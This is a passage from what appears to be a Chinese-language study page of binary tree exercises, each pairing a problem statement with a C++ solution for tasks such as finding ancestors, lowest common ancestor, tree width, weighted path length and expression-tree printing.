	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root<span class="token operator">-></span>left<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">freeMemory</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
		root<span class="token operator">-></span>left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root<span class="token operator">-></span>right<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">freeMemory</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
		root<span class="token operator">-></span>right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">deleteXNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">deleteXNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="值为x的结点的祖先"><a href="#值为x的结点的祖先" class="headerlink" title="值为x的结点的祖先"></a>值为x的结点的祖先</h1><h2 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h2><p>在二叉树中查找值为 x 的结点，试编写算法打印值为 x 的结点的所有祖先，假设值为 x 的结点的不多于一个。</p>
<h2 id="解题代码-10"><a href="#解题代码-10" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">ancestorOfXNode</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>val <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">bool</span> left <span class="token operator">=</span> <span class="token function">ancestorOfXNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">bool</span> right <span class="token operator">=</span> <span class="token function">ancestorOfXNode</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">||</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> left <span class="token operator">||</span> right<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="两结点的最近公共祖先"><a href="#两结点的最近公共祖先" class="headerlink" title="两结点的最近公共祖先"></a>两结点的最近公共祖先</h1><h2 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h2><p>设 p 和 q 为指向二叉树中任意两个结点的指针，试编写算法找到 p 和 q 的最近公共祖先结点 r.</p>
<h2 id="解题代码-11"><a href="#解题代码-11" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">TreeNode<span class="token operator">*</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> p<span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">||</span> root <span class="token operator">==</span> p <span class="token operator">||</span> root <span class="token operator">==</span> q<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> root<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> left<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> right<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="二叉树的宽度"><a href="#二叉树的宽度" class="headerlink" title="二叉树的宽度"></a>二叉树的宽度</h1><h2 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h2><p>假设二叉树采用二叉链表存储结构，设计一个算法，求非空二叉树 b 的宽度（即具有结点数最多的那一层的结点个数）。</p>
<h2 id="解题代码-12"><a href="#解题代码-12" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">widthOfBT</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	size_t res <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span>
	q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span>
		res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="满二叉树的后序序列"><a href="#满二叉树的后序序列" class="headerlink" title="满二叉树的后序序列"></a>满二叉树的后序序列</h1><h2 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h2><p>设有一棵满二叉树（所有结点值均不同），已知其先序序列为 pre，设计一个算法求其后序序列 post.</p>
<h2 id="解题代码-13"><a href="#解题代码-13" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">getPost</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> preOrder<span class="token punctuation">,</span> <span class="token keyword">int</span> p1<span class="token punctuation">,</span> <span class="token keyword">int</span> q1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> postOrder<span class="token punctuation">,</span> <span class="token keyword">int</span> p2<span class="token punctuation">,</span> <span class="token keyword">int</span> q2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>p1 <span class="token operator">></span> q1<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	postOrder<span class="token punctuation">[</span>q2<span class="token punctuation">]</span> <span class="token operator">=</span> preOrder<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> p1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">getPost</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> p1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p1 <span class="token operator">+</span> mid<span class="token punctuation">,</span> postOrder<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p2 <span class="token operator">+</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getPost</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> p1 <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> q1<span class="token punctuation">,</span> postOrder<span class="token punctuation">,</span> p2 <span class="token operator">+</span> mid<span class="token punctuation">,</span> q2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">postOfFBT</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> preOrder<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> preOrder<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">res</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">getPost</span><span class="token punctuation">(</span>preOrder<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="将叶结点连接为单链表"><a href="#将叶结点连接为单链表" class="headerlink" title="将叶结点连接为单链表"></a>将叶结点连接为单链表</h1><h2 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h2><p>设计一个算法将二叉树的叶结点按从左到右的顺序连成一个单链表，表头指针为 head，二叉树按照二叉链表形式存储。</p>
<h2 id="解题代码-14"><a href="#解题代码-14" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ListNode<span class="token operator">*</span> <span class="token function">linkingLeaves</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>
	q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ListNode<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	ListNode<span class="token operator">*</span> curNode <span class="token operator">=</span> dummy<span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> fNode<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			curNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">ListNode</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
			curNode <span class="token operator">=</span> curNode<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="相似二叉树"><a href="#相似二叉树" class="headerlink" title="相似二叉树"></a>相似二叉树</h1><h2 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h2><p>试设计判断两棵二叉树是否相似的算法。所谓二叉树 T1 和 T2 相似，指的是 T1 和 T2 都是空的二叉树或都只有一个根节点；或者 T1 的左子树和 T2 的左子树是相似的，且 T1 的右子树和 T2 的右子树是相似的。</p>
<h2 id="解题代码-15"><a href="#解题代码-15" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">similarBT</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root1<span class="token punctuation">,</span> TreeNode <span class="token operator">*</span> root2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root1 <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root2 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>root1 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>root2 <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root1<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root1<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span> 
		<span class="token operator">&amp;&amp;</span> root2<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root2<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token function">similarBT</span><span class="token punctuation">(</span>root1<span class="token operator">-></span>left<span class="token punctuation">,</span> root2<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">similarBT</span><span class="token punctuation">(</span>root1<span class="token operator">-></span>right<span class="token punctuation">,</span> root2<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="二叉树的带权路径长度和"><a href="#二叉树的带权路径长度和" class="headerlink" title="二叉树的带权路径长度和"></a>二叉树的带权路径长度和</h1><h2 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h2><p>二叉树的带权路径长度（WPL）是二叉树中所有叶结点的带权路径长度之和，给定一棵二叉树，其叶结点的 val 域保存该结点的非负权值。设 root 为指向 T 的根节点的指针，设计求 T 的 WPL 的算法。</p>
<h2 id="解题代码-16"><a href="#解题代码-16" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">getWPL</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">,</span> nq<span class="token punctuation">;</span>
	q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> fNode<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				res <span class="token operator">+=</span> fNode<span class="token operator">-></span>val <span class="token operator">*</span> len<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>left <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode<span class="token operator">-></span>right <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				nq<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		q <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>nq<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> depth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> root<span class="token operator">-></span>val <span class="token operator">*</span> depth<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">getWPL</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="表达式树转表达式"><a href="#表达式树转表达式" class="headerlink" title="表达式树转表达式"></a>表达式树转表达式</h1><h2 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h2><p>请设计一个算法，将给定表达式树转换为对应的中缀表达式并输出。</p>
<h2 id="解题代码-17"><a href="#解题代码-17" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>TreeNode<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">*</span> root<span class="token punctuation">,</span> <span class="token keyword">int</span> depth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>left <span class="token operator">==</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> root<span class="token operator">-></span>right <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"("</span><span class="token punctuation">;</span>
		<span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>left<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> root<span class="token operator">-></span>val<span class="token punctuation">;</span>
		<span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token operator">-></span>right<span class="token punctuation">,</span> depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">")"</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">getInfixExp</span><span class="token punctuation">(</span>TreeNode<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="判定顺序存储二叉树是否为二叉搜索树"><a href="#判定顺序存储二叉树是否为二叉搜索树" class="headerlink" title="判定顺序存储二叉树是否为二叉搜索树"></a>判定顺序存储二叉树是否为二叉搜索树</h1><h2 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知非空二叉树 T 结点值均为正整数，采用顺序存储方式存储，T 中不存在的结点在数组中用 -1 表示。请设计一个尽可能高效的算法，判定一棵采用这种方式存储的二叉树是否为二叉搜索树。</p>
<h2 id="解题代码-18"><a href="#解题代码-18" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">dfs</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> T<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> lastVal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
